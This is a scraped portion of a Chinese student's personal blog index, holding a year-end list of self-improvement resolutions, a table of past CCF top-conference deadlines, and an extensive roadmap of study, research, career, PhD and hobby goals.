学习之前要规划好学习的路径 多去和优秀的人打交道，从他们身上获取方法 对知识要有深刻的了解，一味的刷题而不反思是没有用的 拒绝幻想，脚踏实地去做事情，去准备，来求得一个好的结果 多提升个人能力，多和人打交道，来提升自信心 学会探索多样的兴趣爱好，充实自己的生活 多接触一些事物，多努力，多争取机会 不能只埋头学习，还要看路 提升外貌，这是必要的工作！不能穿的像个乞丐！ 多上网了解学习路径、学习资料、学习方法 要多多上网，不要有信息差 强化个人能力是关键 抓紧时间，不要虚度光阴 考研就努力考研，找工作就努力找工作 不要放纵自己，不要总是休息，行动力要强，才能有好的出路 要努力找工作，虽然我的情况不是很好，但是也要努力争取更好的机会 不能像个老好人一样，对什么人都好，有的人不值得我对他们好 目标感要强，对每个目标都付出200%的努力 不能总是光刷一些简单的课程来获取心理安慰，要挑战自己，要相信自己 行动力要强，执行力要强，专注力要强 拒绝和他人比较，拒绝无谓的精神内耗，用行动来换取更好的未来和心里的踏实 不能固执己见，性格执拗，一条路走到黑 不能整天想着学习，要多同外面的人交流，抓住机会找到工作 不可陷入大而全的完美主义误区 要达到某个目标，就为了这个目标一心努力，不要有二心 活在当下，不能整天幻想 拒绝精神内耗，用执行来拒绝焦虑 不要和他人比较， 这点最为要命 不要去思考不可能发生的事情，不要为了这些事情而担忧 拒绝习得性无助，任何人的人生都可能逆境翻盘，没有永恒的顺境，也没有永恒的逆境。只要努力，总会有逆风翻盘的一天。 战胜自己对不确定性的迷茫和恐惧，坚定的走出去，迈进人生里 对于时间要有正确的认识。如果不抓紧，再多的时间也会流走。只要抓紧时间，一切皆有可能。 不能放纵自己，不要对自己有盲目的自信，正确认识自己，全面认识自己 要养成一颗大心脏，像樊振东那样，提升能力，拒绝焦虑 要勇于挑战舒适区，勇敢的迈出那一步 提高生活自理能力 健身，强化身体素质 应该通过行动提升能力，来拒绝焦虑，而不是通过放松享乐 要养成强大的内心，旺盛的生命力，和坚强的精神状态（参考《飘》的女主斯嘉丽），别让父母为我担心 脸皮厚一些，勇敢一些，坚强的出击，去和人打交道 自己搞一笔钱，努力改善外貌 坚持减肥，提高身材，遇到喜欢的男孩子要主动出击 学习直面恐惧 不要在意他人的看法和一些评价 ","date":"2024-11-13","objectID":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/:5:0","series":["记录"],"tags":null,"title":"年终错误总结报告","uri":"/%E5%B9%B4%E7%BB%88%E9%94%99%E8%AF%AF%E6%80%BB%E7%BB%93%E6%8A%A5%E5%91%8A/#需要改进的点"},{"categories":["科研"],"content":" 信息来源于ccf-deadlines中的以往顶级会议截稿日期。 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:0:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#"},{"categories":["科研"],"content":" 1 计算机体系结构/并行与分布式系统/存储系统 SC 4-3/4-7/4-2 MICRO 4-19/4-29/4-22/4-17 HPCA 8-3/8-5/8-2/7-31 PPoPP 8-17/8-5/8-18/8-14/8-14 FAST 9-18/9-22/9-23/9-24/9-25 EuroSys 10-23/10-20/10-19/10-10/10-10 ASPLOS 10-19/12-1/10-21/8-7/8-22 ISCA 11-15/11-22/11-22/11-24 DAC 11-21/11-21/11-22/11-23 USENIX ATC 1-15/1-13/1-17/1-14/1-13 HotOS 2-2 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:1:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#计算机体系结构并行与分布式系统存储系统"},{"categories":["科研"],"content":" 2 计算机网络 INFOCOM 8-1/8-1/8-2/8-1/8-16 NSDI 9-20/9-22/9-21/9-16 MobiCom 9-6/8-26/3-18/8-26 SIGCOMM 2-1/2-3/2-16/2-3/1-28 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:2:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#计算机网络"},{"categories":["科研"],"content":" 3 软件工程/系统软件/程序设计语言 OOPSLA 2-4/4-6/8-19/8-16 SOSP 4-20/4-18/5-8 ASE 6-8/5-6/5-7 FM 7-2/5-7 POPL 7-12/7-12/7-8/7-9 ICSE 8-3/8-2/9-2/9-4 ESEC/FSE 9-13/9-29/2-3/5-18 PLDI 11-15/11-17/11-11/11-20/11-21 OSDI 12-11/12-8/12-14/12-15 ISSTA 11-1/4-13/2-17 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:3:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#软件工程系统软件程序设计语言"},{"categories":["科研"],"content":" 4 数据库 ICDE 8-3/12-4/10-9/11-18/10-2 SIGKDD 8-2/2-9/2-11/2-9 VLDB 每月一次提交 SIGMOD 10-18/10-16/10-16/9-16/9-23 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:4:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#数据库"},{"categories":["科研"],"content":" 5 计算机科学理论 FOCS 4-5 SODA 7-6 STOC 11-5/11-7 LICS 1-24 CAV 1-22 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:5:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#计算机科学理论"},{"categories":["科研"],"content":" 6 计算机图形学与多媒体 SIGGRAPH 1-24/5-20(ASIA)/1-25/5-24(ASIA)/1-26 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:6:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#计算机图形学与多媒体"},{"categories":["科研"],"content":" 7 人工智能 ICCV 5-9/5-18 NeurlPS 5-23/5-18/5-20/5-29 AAAI 8-16/8-16/8-16/9-9 CVPR 11-15/11-18/11-12/11-17 IJCAI 1-24/1-19/1-15 ICML 1-31/2-2/1-27/1-28 ACL 2-16/2-16/1-21/11-16 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:7:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#人工智能"},{"categories":["科研"],"content":" 8 数学 数学年刊 Annuals of Mathematics 数学新进展 inventiones mathematicae acta mathematica 美国数学会杂志 ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:8:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#数学"},{"categories":["科研"],"content":" 9 主要关注会议 PPoPP FAST EuroSys ASPLOS USENIX ATC HotOS OOPSLA SOSP POPL PLDI OSDI VLDB SIGMOD FOCS STOC ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:9:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#主要关注会议"},{"categories":["科研"],"content":" 10 各月份顶会deadline7月：POPL SIGMOD 8月：HPCA PPoPP 9月：FAST NSDI EuroSys 10月：ASPLOS SIDMOD 11月：PLDI 12月：OSDI 1月：USENIX ATC 2月：HOTOS SIGCOMM OOPSLA 4月：MICRO SOSP SIGMOD 5月：EuroSys FAST ","date":"2024-11-09","objectID":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/:10:0","series":null,"tags":["deadline"],"title":"CCF 重要顶会及截止时间概览","uri":"/ccf-a%E7%B1%BB%E4%BC%9A%E8%AE%AE%E6%88%AA%E6%AD%A2%E6%97%B6%E9%97%B4%E6%A6%82%E8%A7%88/#各月份顶会deadline"},{"categories":null,"content":" 循此苦旅，以达天际 这是本人的学习周报记录，参考的是Skr-Learning学习周报。这里定期记录一些学习的内容与进度。在人生的攀登过程中，最重要的是保持身体健康和积极的心态，保持快乐。不可玩物丧志，不可在莫名其妙的对未来的忧虑中度日，人的一生要过的丰满充沛，要过的绚烂，没有时间可以耗费。唯有不断地向目标前进，才能抵达最后的彼岸。努力不一定有好结果，但是不努力一定不会有好结果。我刻苦努力，我接受一切结果。 我的成长路径： 完成所有列表任务； 在github吸引1k followers，单个项目达到20k star，实现高阅读量博客，能够在未来保障自己的人身安全和开源影响力； 在开源社区打出名声； 申请香港学校研究生； 找到字节跳动、Deepseek、MSRA等公司的工作/实习； 通过各种手段搞到1000w，实现财富自由，不让爹妈再来用钱打压我、控制我； 把身体锻炼强壮，练出一身肌肉，消去所有疾病，不让学习受到身体拖累，不让自己受人欺负； 把自己打扮漂亮，找到优秀的男朋友； 努力进行系统方向科研，修炼到系统方向顶尖水准（陈榕水平）； 先冲击7-19的ICSE，9-17的FAST和9-26的EuroSys，争取3篇顶级会议论文录取； 实现根据需求，自动生成代码工程项目的autoCode插件，发表一篇AI顶级会议论文； 成为系统顶级会议论文大满贯（且科研成果质量过硬），吸引合作，然后申请MIT PDos 实验室的 CS phD； phD期间参加顶级科技公司的research intern，做出领衔世界的科技创新，在学术界超越陈； 进入字节topseed/幻方/deepseek工作，掌握核心科技； 自己创办deepseek那样的顶级科技公司，推动中国计算机科技和教育领衔世界，成为像雷军那样的CEO；（雷军水平） 努力在行业内打出名声，让科技造福人民群众，成为政协委员，向国家提出建议，改造国家； 做出努力实践，像毛主席和周恩来总理一样，让国家和社会变得更美好； ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:0:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#"},{"categories":null,"content":" 1 能力提升阶段 vim使用学习，使用vimtutor掌握基础即可，通过后期的实践进行强化 ✅ 2024-11-12 根据选校梯度 - Open CS Application 和 Global CS 选校 ✅ 2024-11-12 购买代理 ✅ 2025-01-05 计算机学习路径全部完成，学习各门课程，大量尝试各种内容，发掘自己的爱好所在（不要通过想象力去脑补，要通过真实的体验去感受），掌握计算机技术。并且通过研读论文，准备进行进一步的科学研究 Pre部分完成，巩固数学基础并配置编程环境 刷课部分完成，把刷课笔记放在博客上 每节课用Markdown写总结，重点标注「论文引用」和「工业应用」（如Google Spanner）。 实验代码提交到GitHub，README写明设计思路和性能对比。 算法刷题准备，把刷题笔记放在博客上 面试准备，把面试准备过程放在博客上 课程源码研究，把课程项目研究过程放在博客上 造轮子，把造轮子过程写在博客上 经典开源项目研究，把研究过程写在博客上 将一个大的系统啃透（从文档/小bug修复切入） 进入Linux核心贡献者 进入qemu核心贡献者 进入cpython核心贡献者 进入postgreSQL核心贡献者 进入mysql核心贡献者 进入LLVM核心贡献者 1. 从LLVM Good First Issues选1个文档/测试用例任务 1. 提交PR后，主动约Maintainer的Office Hour（邮件问：“Could I have 15 mins to discuss my PR?\"） 合并至少2个PR（代码/文档均可） 开发1个工具级项目 用eBPF实现一个分布式追踪工具（对标bpftrace，但聚焦K8s环境） 或用Rust写一个极简版Spark（支持MapReduce API） 每周迭代1个核心功能（如第1周：任务调度；第2周：容错机制） 顶会论文阅读 \u0026 复现，把阅读笔记写在博客上 自我提升书籍阅读 个人项目开发 算法 理论计算机 系统 安全 AI 方向 Web 和安卓开发 游戏开发 找到工作并赚到钱（字节跳动等大厂） 投递MSRA系统组/字节跳动Infra实习（内推优先） MSRA：在知乎搜索\"MSRA实习内推”，联系近3个月发帖的实习生 1）改好简历 2）内推确认 3）刷完《DDIA》第9章 字节：直接给字节校招官网的Infra组HR发邮件（附GitHub和博客链接） 必考：Raft协议、B+树实现、CPU缓存一致性（参考《DDIA》第5-7章） 准备《系统设计面试手册》（整理大厂高频题） Security Bug Bounty（HackerOne平台） HackerOne（从\"Easy\"标签开始，重点找Web逻辑漏洞） 每天1小时，记录漏洞模式（如JWT伪造、IDOR） 外包接单（TopCoder/Upwork，侧重系统相关） 面试样例 markdown ## 设计Twitter - 需求：QPS=10k，关注功能，feed流时序 - 存储：MySQL分库（按用户ID哈希）+ Redis缓存热点 - 扩展：用Snowflake生成分布式ID，用Kafka异步处理关注关系 确定自己的爱好方向（重要！不是所有的方向都值得我去研究！），一定要找到让自己感兴趣的那个 要能做到对实现任何东西都毫不费力 做好一切进行计算机方向科研的准备，并开始进行计算机科研工作，努力发表顶会论文 终极目标达成 成为计算机巨佬，在github上达到1k followers 抓紧刷算法题，准备进入大厂，把leetcode上的习题基本都刷完，然后持续投递简历，并且面试（积极投递，多多面试，不要害怕，勇敢面对，加油，一切都会好的） 一些OJ书籍学习 算法竞赛三大本学习完成 各种OJ平台刷题完成 Leetcode LeetCode系统设计题 LeetCode系统设计高频题（每天1题，重点：设计Twitter/短链服务） 6.824 Lab重点：Raft一致性算法、Sharded KV存储（实现容错和线性一致性） 能白板手写Raft选举逻辑，解释CAP定理在Lab中的体现。 其他算法题 Codeforces AtCoder 残酷刷题群加入，每天大量刷题 国内计算机岗位投递+面试完成，找到工作 整理公司名称 对工作单位做背景调查 投递简历+面试 对所有计算机课程资料笔记进行总结，用自己的语言进行复述，建立Open CS University（重要！），让中国的计算机教育和计算机技术发展不再受制于人 完善博客中的个人简介，让更多人认识我 物理基础和电子信息基础打牢 普通物理学学习，掌握基本的物理知识 基础电子电路和信号与系统学习，掌握基本的电子电路知识 模拟电子电路 信号与系统 制作一些电子电路的东西 把计算机一站式指导手册肝出来，振兴中国的计算机教育事业 学完所有知识，实现一个计算机课程教育指南（带实验），做一个刷课网站，实现刷课排行榜和刷课竞赛 工作简历制作完成并投递，找到大厂工作 英语能力终极强化，要能做到和外国人交流无障碍，阅读、写作、听力无障碍，对国外文化有深入了解 词汇量终极进化 知乎搜集词汇量增大的方法 🆔 3spscf 疯狂记单词，努力增加词汇量 ⛔ 3spscf 阅读能力：海量阅读英文原版书籍（如哈利波特） 🆔 9mnmii 知乎搜索阅读能力提升的方法 知乎搜索写的好的英文原版书籍，并下载下来，或者在家里读 哈利波特阅读完成 福尔摩斯探案集阅读完成 简爱阅读完成 至少阅读100本世界名著 其他书籍 ⛔ 9mnmii 写作能力：进行海量阅读和写作训练 知乎搜索英文写作提升方法 🆔 tkt987 知乎搜索好的英文原版刊物，每天至少阅读100篇 努力学习好的英文原版刊物的写作方法，积累下来 ⛔ tkt987 听力训练：进行大量强力听力训练 知乎搜索英语听力提升方法 🆔 hhko8z 知乎搜索好的听力材料 对着听力材料进行大量听力训练，至少100篇听力材料 ⛔ hhko8z 口语训练：美式口音学习，进行大量口语训练 知乎搜索口语提升方法 去口语软件上找外国人聊天，提升口语 每天对着电视节目大声朗读，提升口语能力 准备一星期，三大英语考试全部高分通过 🆔 sjkepr 雅思 8+ 知乎搜索雅思复习方法 🆔 m1hc8t 知乎搜索雅思书籍 攒钱购买雅思书籍 疯狂进行雅思刷题训练，并总结错题和题型 ⛔ m1hc8t 搜索雅思考试的注意事项 参加雅思考试 托福 110+ 知乎搜索托福复习方法 🆔 58tbv5 知乎搜索托福书籍 攒钱购买托福书籍 疯狂进行托福训练，并总结错题和题型 ⛔ 58tbv5 搜索托福考试的注意事项 参加托福考试 GRE 330+ 知乎搜索GRE复习方法 🆔 52yuz1 知乎搜索GRE书籍 攒钱购买GRE书籍 疯狂进行GRE训练，并总结错题和题型⛔ 52yuz1 搜索GRE考试的注意事项 参加GRE考试 成为英语巨佬 开发出英语训练Web平台和软件 开发一个可以帮助中国人和外国人学习中文和英文的口语搭档网站 在指导手册中加入英语学习和国外英语考试备考模块 研究各个系统顶级会议论文的写作手法，总结出规律经验 学术英语训练 听力：MIT OpenCourseWare系统讲座（1.5倍速盲听，后对照字幕） 写作：模仿SOSP论文摘要的句式（每周精读1篇+仿写2段） 数学学习完成，像法国人那样掌握深厚的数学功底，能够做到对数学本身、以及计算机科学中的数学有游刃有余的使用能力，并且能够利用数学进行新的科研工作，对理论计算机、算法、数理逻辑，尤其是组合数学进行研究 基础数学四大课程学习完成 彻底根除数分顽疾 高代（线代） 常微分方程 概率论与数理统计 数学题刷爆 3 轮，保证模拟水平稳定 140+，也为计算机课程的学习做好铺垫 张天德数学竞赛习题完成 汤家凤1800刷1遍 李范全书+李永乐讲义3遍 张宇1000题3遍 数学真题刷3遍并总结题型 知乎搜索数学优秀模拟题 🆔 ckoiwv 赚到足够多的钱，去购买数学模拟题 模拟题购买并刷爆3遍 ⛔ ckoiwv 后续数学基础速通路线学习完成，为计算机课程的学习做好铺垫 抽象代数 代数学 数理逻辑 拓扑学 组合数学 图论 初等数论 离散数学 计算机数学一直学习到计算复杂性 -\u003e 为计算机课程的学习做好铺垫 算法入门 数据结构与算法分析 算法设计与分析 计算理论 计算复杂性理论 信息论与编码 理论计算机导论 计算几何 密码学 最优化方法 解析几何 数值分析 矩阵计算 矩阵论 数学物理方法 其他数学训练完成，成为数学巨佬。大力学习，找到自己十分感兴趣的方向，进行深入探索，数学相关的任务全部完成，要把数学基础打磨的超级厉害 纯数学习路径完成 USTC 数学学习路径完成 常用教科書列表與簡評 | 臺大數學系 (ntu.edu.tw)阅读完成 MIT 数学学习路径完成 重点进行代数、数论、组合、数理逻辑、密码学、概率论、优化理论、矩阵论方面的研究 彻底战胜对数学的恐惧！成功驾驭数学！ 在指导手册中加入数学学习模块 阅读海量系统，AI，理论计算机相关论文，复现大量论文，广泛学习科研成果，争取在硕士入学前就发表自己的系统顶会论文 从PDos Lab近期论文选5篇 + MSRA系统组论文选5篇 优先选择「存储优化」「AI Infra」方向（如《TensorFlow RDMA》《PolarFS》） 复现步骤： 用git clone下载论文开源代码（如没开源，邮件作者请求） 在AWS/Aliyun上租用2台ECS（按量付费），部署测试环境 修改参数跑通Benchmark，记录性能差异（写进博客） 知乎搜","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:1:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#能力提升阶段"},{"categories":null,"content":" 2 参加工作阶段 参加工作，持续提升技术，广交人脉 针对自己感兴趣的方向，找到大厂工作（如字节跳动），一定要融入好的环境（重要！） 🆔 cgn22h 开发计算机行业通讯录软件，更多的补充计算机行业的人脉关系 尽可能多的认识同事和其他大厂里的同学，其他厂子里的也要积极认识一下，以后如果有什么事情还尽可能有个照应，不至于孤立无援；以后也可以获得远程实习的机会，可以利用单位的机器来做实验； 研究大厂项目源码和开发模式 对项目进行优化 尽可能地阅读多的系统和其他方向顶会论文，并且利用开发的机会把优化功能用在公司项目上做实验，以此发表论文，并且寻求晋升的机会（非常重要！晋升一定要快，这样才能更快的走向更高的地方！） 肝到P10级别 ⛔ cgn22h 研究大厂管理模式 广交人脉，结识优秀的同学 学习到大厂的创业经历、人力资源管理、部门管理、企业文化 基于大厂的工作经历，开始孵化自己的创业项目 利用人脉进行项目推广 实现第一轮财富积累 实现项目经验积累 研究大厂产品和人员管理 广泛观察工作中的企业管理经验、产品经验、以及企业管理的弊端 阅读国内大佬创业史，譬如雷军 知乎搜索互联网大佬创业经验分享书籍以及博客 阅读雷军等人的创业历史 阅读大量社科书籍，积累社会观察力 去图书馆和网络详细查阅行业发展报告和国家经济数据，仔细研究国家社会走向和行业发展动态 开发出多个像vue那样的在世界范围内有广泛影响力的开源项目，而不是自娱自乐的玩具，开发的角度不一定要局限于系统，也要囊括AI等，和其他的一些项目（比如安卓软件开发、前后端开发、我自己手机上的那些创业项目） 积累成熟的产品开发经验和人员管理经验，必须非常成熟 探索现在行业缺乏的软件，从小的工具开始，尽更大可能减少程序员的工作麻烦和其他麻烦，探索更多需求，有的可以记录在手机上 把自己的那些创业idea全部逐个实现 学好英文，更大可能去探索海外用户市场 开发网络互联公司的全新商业模式，多个开发者无需线下在一起办公，靠赞助sponsor盈利赚钱，赚到的钱按照github contributions进行分配，建立线上的合作制度和相关办公协作软件，这样最大限度的避免了公司内部开会以及其他工作带来的开发上的耗时麻烦 选择合适的赛道，先做出小的产品 逐步扩大产品规模 拓展人脉，寻找合作伙伴 进行商业融资 全面扩大产品规模 重点是一定要利用大厂的资源，避免以后把实验室的项目做成玩具！ 先做到大厂P10等级，再去思考创业的事情 AI Infra的开发也要努力实现 做各个方向的产品 继续开发个人信息创业项目 搞到1000w，买新衣服，开始学习享受生活 实现第二轮财富积累 结识更多人，必要时候挖掘人才，继续在读研时进行开发工作 攒够买房买车的钱（至少攒够3000万保底） 留一笔钱作为应急备用 报羽毛球、小提琴班，并且购买电吉他 学习羽毛球 🆔 bo3gq9 知乎搜索如何找到好的羽毛球老师 去体育学院附近找到羽毛球馆 在羽毛球馆里找到羽毛球老师 报班学课 身体素质训练，每天跑10个400米，练出林丹那样的身体素质 羽毛球挥拍训练，步伐和速度训练 健身，进行身体力量训练 努力练习，提升羽毛球技术⛔ bo3gq9 拿到羽毛球公开赛冠军 开始疯狂学习小提琴，成为海菲兹那样的小提琴大师 🆔 iediec 找到好的老师 知乎搜搜如何找到好的小提琴老师 找到一个好老师，加上微信，拜师学艺，确认上课时间和金额 买到小提琴 知乎搜索如何判断小提琴好坏 知乎搜索如何买小提琴 购买一把性价比高的小提琴 开始疯狂练习，磨练技术，向国际小提琴大赛进发⛔ iediec 每天早上练习3小时，时拍摄视频到B站上，并且将每日练琴记录在博客上 努力成为百万UP主 可以考虑寻找小提琴的演出机会 学习电吉他，成为电吉他大佬 🆔 k4zksw 搜索好的电吉他教材 知乎和B站搜索好的电吉他课程 学习如何挑选电吉他 购买一把好的电吉他 开始进行强力练习，向电吉他巨佬进发 ⛔ k4zksw 练习时拍摄视频到B站上，并且将电吉他每日记录在博客上 成为B站百万UP主 学习作曲 知乎搜索好的作曲书籍 🆔 4tj7we 努力学习作曲，并且多多实践⛔ 4tj7we 进行作曲接单工作 学习编曲 知乎搜索如何学习编曲 知乎了解哪些好的编曲作品 学习大量好的编曲作品，努力听出歌曲中的每个配器 大量实践，提升编曲水平 像业内人士请教如何编曲 接编曲单子 开始参与大型作品制作 学习AI和音乐相关工作 开发出AI扒谱的功能，上限软件 学习音乐工程制作 学习信号的处理及音频软件的使用 学习音乐演唱 知乎搜索好的声乐教材 知乎搜索好的声乐视频 根据Da老师的路线，配合书籍，努力学习声乐，要能够嗓子干净，能唱强混和五组高音 学习和声学 知乎搜索好的教材 🆔 isot6y 知乎搜索好的和声学课程 努力学习和声学 ⛔ isot6y 学习国际象棋，参加国际象棋比赛，拿到冠军 搜集国际象棋的好书 研究国际象棋对战 在chess.com上与各国棋手对战 现场与其他棋手对战 赢得一个冠军 将国际象棋作为资金的来源之一 学习摄影 购买一台照相机 知乎搜索摄影学习过程及学习资料 开始系统学习摄影 📅 2025-5-31 做系统方向科研，积累3篇系统方向顶级会议论文 📅 2025-8-1 Systems Conferences by Deadline - computer systems, operating systems, computer architecture, programming languages, parallel computing, distributed computing, supercomputing, HPC, schedule, deadline, date, notification, location - Dan Tsafrir SOSP POPL OOPSLA OSDI PLDI USENIX Security PPoPP HPCA ASPLOS MICRO USENIX ATC FAST EuroSys 1）完成实验 2）用Overleaf写论文 3）找PDos学生润色 继续循环进行上述步骤，无限变强，包括 继续搞钱,以1000w为单位继续搞钱 健身，身体素质拉的越强越好 厨艺精进,做饭越来越好吃 进行外貌打理，卷外貌 创业，开源贡献及赚钱，成为雷军那样的大佬 个人技术水平无限提升，成为Jeff Dean那样的大佬 个人数学能力无限提升，成为丘成桐那样的大佬（不是说人品） 科研水平无限提升，成为海波老师那样的系统方向大佬 积攒更多人脉 努力提升我国的计算机整体水平 成为小提琴大师，成为海菲兹那样的大佬 羽毛球技术精进，成为林丹那样的大佬 找到好的感情，过上好的生活 ","date":"2024-10-26","objectID":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/:2:0","series":["记录"],"tags":null,"title":"任务列表和目标规划","uri":"/task/%E4%BB%BB%E5%8A%A1%E5%88%97%E8%A1%A8/#参加工作阶段"},{"categories":null,"content":" 3 系统科研阶段 找到 deepseek MSRA 字节 幻方 腾讯的实习/工作 找各种单位参加各种科研实习，争取各个各个实验室的合作 AI Lab MIT PDos Lab 以及相近的组的科研实习 字节跳动科研实习 腾讯科研实习 微软亚洲研究院系统组科研实习 MSRA (Shanghai) System and Engineering Group - Microsoft Research Research Intern for Systems Research Group - Microsoft Research (18 封私信 / 80 条消息) 怎么才能去MSRA实习？ - 知乎 (18 封私信 / 80 条消息) 微软亚洲研究院 (MSRA) 的实习体验如何？ - 知乎 科研实习 | 微软亚洲研究院招聘研究实习生 - 知乎 铸星闪耀 | 黄群：从中科院计算所到 MSRA，三个月访问投出一篇论文 - Microsoft Research 找到 Caltech/UC Berkeley/MIT/Stanford/CMU 的科研实习RA工作 结识音乐方面人脉，寻找小提琴演出机会 进入读研学校的交响乐团，参与交响乐团排练 发表数学四大论文 搜集数学四大论文，看看都是哪个方向的 仔细研读四大论文 学习丘成桐的过往经验 深入进行数学方向的研究，主要是数论和组合方向，必要时向其他数学研究者发邮件请求帮助 努力研究，争取能够发表数学四大论文，这样我也能多一条出路 为PhD申请做准备 1）SOP定稿 2）3封推荐信确认 3）GRE送分 顶尖985/美本Top 30 GPA \u003e= 3.8/4.0 顶级会议论文3篇 专业知识过硬 数学基础过硬 2-3段系统软件相关科研 顶级会议论文：SOSP、OSDI、NSDI、EuroSys、USENIX Security 高质量项目：开源贡献，复现前沿论文 暑研/推荐信：去MIT、CMU、Berkeley等校做科研，拿到强推荐信 GRE：Optional（但如果有，Quant ≥ 168，AW ≥ 4.0） TOEFL/IELTS：TOEFL ≥ 105（口语 ≥ 23），IELTS ≥ 7.5 口语能力强 3封强推，至少1封来自国际知名学者（如MIT/Stanford教授） 最好有PDOS Lab合作过的教授推荐 熟练掌握C/C++/Rust，能写高性能系统代码（如自己实现小型OS、文件系统） 开源贡献：向Linux内核、Kubernetes等知名项目提交过PR 复现顶会论文（如自己实现一篇SOSP论文的算法） 博客/技术文章：在Medium、知乎等平台写高质量技术分析（展示思考深度） ACM-ICPC区域赛金牌（或类似系统竞赛，如MIT 6.824课程高分） 创业/工业界项目：比如开发过一个被广泛使用的工具（如分布式调试框架） PDOS Lab可能要求现场写代码（如实现一个简单的文件系统） 提前联系PDOS Lab教授（如Nickolai Zeldovich、Frans Kaashoek），表达研究兴趣 SOP中明确提到PDOS Lab的项目（如XV6、FSCQ） GitHub放高质量项目（如自己写的OS内核） 混申CMU、Stanford、Berkeley等校的系统实验室 研究陈述（SOP）、简历、代码样本 去微软研究院（MSR）、Google Brain等工业界实验室做RA 先申CMU MSCS、Stanford MS等，再转PhD 长期贡献知名项目（如Kubernetes），建立行业声誉 最终目标：让委员会觉得 “这人来了就能发顶会论文”，而非\"还需要培养\" 申请到MIT PDos Lab的phD 📅 2026-9-1 先把自己的经验全部放在博客中，然后再整理出一些问题解决手册和实用生活自救指南，帮助困境中的他人 